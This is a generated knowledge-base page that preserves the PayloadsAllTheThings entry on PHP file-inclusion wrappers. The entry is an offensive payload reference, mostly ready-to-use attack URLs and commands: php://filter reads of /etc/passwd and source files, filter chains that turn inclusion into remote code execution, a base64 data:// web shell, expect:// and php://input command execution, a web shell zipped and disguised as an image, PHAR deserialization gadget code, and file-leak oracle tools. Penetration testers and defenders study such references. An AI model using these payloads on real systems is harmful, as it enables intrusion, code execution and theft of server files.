---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Inclusion Using Wrappers

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-file-inclusion-wrappers` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/Wrappers.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Inclusion Using Wrappers](../../topics/file-inclusion/inclusion-using-wrappers.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-file-inclusion-wrappers |
| name | Inclusion Using Wrappers |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md |

## Preserved Source Material

````yaml
_body: "# Inclusion Using Wrappers\n\nA wrapper in the context of file inclusion vulnerabilities refers to the protocol or\
  \ method used to access or include a file. Wrappers are often used in PHP or other server-side languages to extend how file\
  \ inclusion functions, enabling the use of protocols like HTTP, FTP, and others in addition to the local filesystem.\n\n\
  ## Summary\n\n- [Wrapper php://filter](#wrapper-phpfilter)\n- [Wrapper data://](#wrapper-data)\n- [Wrapper expect://](#wrapper-expect)\n\
  - [Wrapper input://](#wrapper-input)\n- [Wrapper zip://](#wrapper-zip)\n- [Wrapper phar://](#wrapper-phar)\n    - [PHAR\
  \ Archive Structure](#phar-archive-structure)\n    - [PHAR Deserialization](#phar-deserialization)\n- [Wrapper convert.iconv://\
  \ and dechunk://](#wrapper-converticonv-and-dechunk)\n    - [Leak file content from error-based oracle](#leak-file-content-from-error-based-oracle)\n\
  \    - [Leak file content inside a custom format output](#leak-file-content-inside-a-custom-format-output)\n- [References](#references)\n\
  \n## Wrapper php://filter\n\nThe part \"`php://filter`\" is case insensitive\n\n| Filter | Description |\n| ------ | -----------\
  \ |\n| `php://filter/read=string.rot13/resource=index.php` | Display index.php as rot13 |\n| `php://filter/convert.iconv.utf-8.utf-16/resource=index.php`\
  \ | Encode index.php from utf8 to utf16  |\n| `php://filter/convert.base64-encode/resource=index.php` | Display index.php\
  \ as a base64 encoded string |\n\n```powershell\nhttp://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\n\
  http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\n\
  http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n```\n\nWrappers can be chained\
  \ with a compression wrapper for large files.\n\n```powershell\nhttp://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n\
  ```\n\nNOTE: Wrappers can be chained multiple times using `|` or `/`:\n\n- Multiple base64 decodes: `php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s`\n\
  - deflate then `base64encode` (useful for limited character exfil): `php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php`\n\
  \n```powershell\n./kadimus -u \"http://example.com/index.php?page=vuln\" -S -f \"index.php%00\" -O index.php --parameter\
  \ page \ncurl \"http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\" | base64 -d >\
  \ index.php\n```\n\nAlso there is a way to turn the `php://filter` into a full RCE.\n\n- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)\
  \ - A CLI to generate PHP filters chain\n\n  ```powershell\n  $ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'\n\
  \  [+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)\n\
  \  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.UCS-2.UTF8|convert.iconv.L6.UTF8|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp\n\
  \  ```\n\n- [LFI2RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Files/LFI2RCE.py)\
  \ to generate a custom payload.\n\n  ```powershell\n  # vulnerable file: index.php\n  # vulnerable parameter: file\n  #\
  \ executed command: id\n  # executed PHP code: <?=`$_GET[0]`;;?>\n  curl \"127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd\"\
  \n  ```\n\n## Wrapper data://\n\nThe payload encoded in base64 is \"`<?php system($_GET['cmd']);echo 'Shell done !'; ?>`\"\
  .\n\n```powershell\nhttp://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\n\
  ```\n\nFun fact: you can trigger an XSS and bypass the Chrome Auditor with : `http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+`\n\
  \n## Wrapper expect://\n\nWhen used in PHP or a similar application, it may allow an attacker to specify commands to execute\
  \ in the system's shell, as the `expect://` wrapper can invoke shell commands as part of its input.\n\n```powershell\nhttp://example.com/index.php?page=expect://id\n\
  http://example.com/index.php?page=expect://ls\n```\n\n## Wrapper input://\n\nSpecify your payload in the POST parameters,\
  \ this can be done with a simple `curl` command.\n\n```powershell\ncurl -X POST --data \"<?php echo shell_exec('id'); ?>\"\
  \ \"https://example.com/index.php?page=php://input%00\" -k -v\n```\n\nAlternatively, Kadimus has a module to automate this\
  \ attack.\n\n```powershell\n./kadimus -u \"https://example.com/index.php?page=php://input%00\"  -C '<?php echo shell_exec(\"\
  id\"); ?>' -T input\n```\n\n## Wrapper zip://\n\n- Create an evil payload: `echo \"<pre><?php system($_GET['cmd']); ?></pre>\"\
  \ > payload.php;`\n- Zip the file\n\n  ```python\n  zip payload.zip payload.php;\n  mv payload.zip shell.jpg;\n  rm payload.php\n\
  \  ```\n\n- Upload the archive and access the file using the wrappers:\n\n  ```ps1\n  http://example.com/index.php?page=zip://shell.jpg%23payload.php\n\
  \  ```\n\n## Wrapper phar://\n\n### PHAR archive structure\n\nPHAR files work like ZIP files, when you can use the `phar://`\
  \ to access files stored inside them.\n\n- Create a phar archive containing a backdoor file: `php --define phar.readonly=0\
  \ archive.php`\n\n  ```php\n  <?php\n    $phar = new Phar('archive.phar');\n    $phar->startBuffering();\n    $phar->addFromString('test.txt',\
  \ '<?php phpinfo(); ?>');\n    $phar->setStub('<?php __HALT_COMPILER(); ?>');\n    $phar->stopBuffering();\n  ?>\n  ```\n\
  \n- Use the `phar://` wrapper: `curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt`\n\n### PHAR\
  \ deserialization\n\n:warning: This technique doesn't work on PHP 8+, the deserialization has been removed.\n\nIf a file\
  \ operation is now performed on our existing phar file via the `phar://` wrapper, then its serialized meta data is unserialized.\
  \ This vulnerability occurs in the following functions, including file_exists: `include`, `file_get_contents`, `file_put_contents`,\
  \ `copy`, `file_exists`, `is_executable`, `is_file`, `is_dir`, `is_link`, `is_writable`, `fileperms`, `fileinode`, `filesize`,\
  \ `fileowner`, `filegroup`, `fileatime`, `filemtime`, `filectime`, `filetype`, `getimagesize`, `exif_read_data`, `stat`,\
  \ `lstat`, `touch`, `md5_file`, etc.\n\nThis exploit requires at least one class with magic methods such as `__destruct()`\
  \ or `__wakeup()`.\nLet's take this `AnyClass` class as example, which execute the parameter data.\n\n```php\nclass AnyClass\
  \ {\n    public $data = null;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n    \n   \
  \ function __destruct() {\n        system($this->data);\n    }\n}\n\n...\necho file_exists($_GET['page']);\n```\n\nWe can\
  \ craft a phar archive containing a serialized object in its meta-data.\n\n```php\n// create new Phar\n$phar = new Phar('deser.phar');\n\
  $phar->startBuffering();\n$phar->addFromString('test.txt', 'text');\n$phar->setStub('<?php __HALT_COMPILER(); ?>');\n\n\
  // add object of any class as meta data\nclass AnyClass {\n    public $data = null;\n    public function __construct($data)\
  \ {\n        $this->data = $data;\n    }\n    \n    function __destruct() {\n        system($this->data);\n    }\n}\n$object\
  \ = new AnyClass('whoami');\n$phar->setMetadata($object);\n$phar->stopBuffering();\n```\n\nFinally call the phar wrapper:\
  \ `curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar`\n\nNOTE: you can use the `$phar->setStub()` to add\
  \ the magic bytes of JPG file: `\\xff\\xd8\\xff`\n\n```php\n$phar->setStub(\"\\xff\\xd8\\xff\\n<?php __HALT_COMPILER();\
  \ ?>\");\n```\n\n## Wrapper convert.iconv:// and dechunk://\n\n### Leak file content from error-based oracle\n\n- `convert.iconv://`:\
  \ convert input into another folder (`convert.iconv.utf-16le.utf-8`)\n- `dechunk://`: if the string contains no newlines,\
  \ it will wipe the entire string if and only if the string starts with A-Fa-f0-9\n\nThe goal of this exploitation is to\
  \ leak the content of a file, one character at a time, based on the [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py)\
  \ writeup.\n\n**Requirements**:\n\n- Backend must not use `file_exists` or `is_file`.\n- Vulnerable parameter should be\
  \ in a `POST` request.\n    - You can't leak more than 135 characters in a GET request due to the size limit\n\nThe exploit\
  \ chain is based on PHP filters: `iconv` and `dechunk`:\n\n1. Use the `iconv` filter with an encoding increasing the data\
  \ size exponentially to trigger a memory error.\n2. Use the `dechunk` filter to determine the first character of the file,\
  \ based on the previous error.\n3. Use the `iconv` filter again with encodings having different bytes ordering to swap remaining\
  \ characters with the first one.\n\nExploit using [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit),\
  \ the script will use either the `HTTP status code: 500` or the time as an error-based oracle to determine the character.\n\
  \n```ps1\n$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   \n[*] The following\
  \ URL is targeted : http://127.0.0.1\n[*] The following local file is leaked : /test\n[*] Running POST requests\n[+] File\
  \ /test leak is finished!\n```\n\n### Leak file content inside a custom format output\n\n- [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap)\
  \ - Generates a `php://filter` chain that adds a prefix and a suffix to the contents of a file.\n\nTo obtain the contents\
  \ of some file, we would like to have: `{\"message\":\"<file contents>\"}`.\n\n```ps1\n./wrapwrap.py /etc/passwd 'PREFIX'\
  \ 'SUFFIX' 1000\n./wrapwrap.py /etc/passwd '{\"message\":\"' '\"}' 1000\n./wrapwrap.py /etc/passwd '<root><name>' '</name></root>'\
  \ 1000\n```\n\nThis can be used against vulnerable code like the following.\n\n```php\n<?php\n  $data = file_get_contents($_POST['url']);\n\
  \  $data = json_decode($data);\n  echo $data->message;\n?>\n```\n\n### Leak file content using blind file read primitive\n\
  \n- [ambionics/lightyear](https://github.com/ambionics/lightyear)\n\n```ps1\ncode remote.py # edit Remote.oracle\n./lightyear.py\
  \ test # test that your implementation works\n./lightyear.py /etc/passwd # dump a file!\n```\n\n## References\n\n- [Baby^H\
  \ Master PHP 2017 - Orange Tsai (@orangetw) - December 5, 2021](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)\n\
  - [Iconv, set the charset to RCE: exploiting the libc to hack the php engine (part 1) - Charles Fol - May 27, 2024](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)\n\
  - [Introducing lightyear: a new way to dump PHP files - Charles Fol - November 4, 2024](https://web.archive.org/web/20250809094219/https://www.ambionics.io/blog/lightyear-file-dump)\n\
  - [Introducing wrapwrap: using PHP filters to wrap a file with a prefix and suffix - Charles Fol - December 11, 2023](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)\n\
  - [It's A PHP Unserialization Vulnerability Jim But Not As We Know It - Sam Thomas - August 10, 2018](https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)\n\
  - [New PHP Exploitation Technique - Dr. Johannes Dahse - August 14, 2018](https://web.archive.org/web/20180817103621/https://blog.ripstech.com/2018/new-php-exploitation-technique/)\n\
  - [OffensiveCon24 - Charles Fol- Iconv, Set the Charset to RCE - June 14, 2024](https://youtu.be/dqKFHjcK9hM)\n- [PHP FILTER\
  \ CHAINS: FILE READ FROM ERROR-BASED ORACLE - Rémi Matasse - March 21, 2023](https://web.archive.org/web/20260228090126/https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)\n\
  - [PHP FILTERS CHAIN: WHAT IS IT AND HOW TO USE IT - Rémi Matasse - October 18, 2022](https://web.archive.org/web/20260212042712/https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)\n\
  - [Solving \"includer's revenge\" from hxp CTF 2021 without controlling any files - @loknop - December 30, 2021](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)"
_relative_path: File Inclusion/Wrappers.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/File Inclusion/Wrappers.md
````
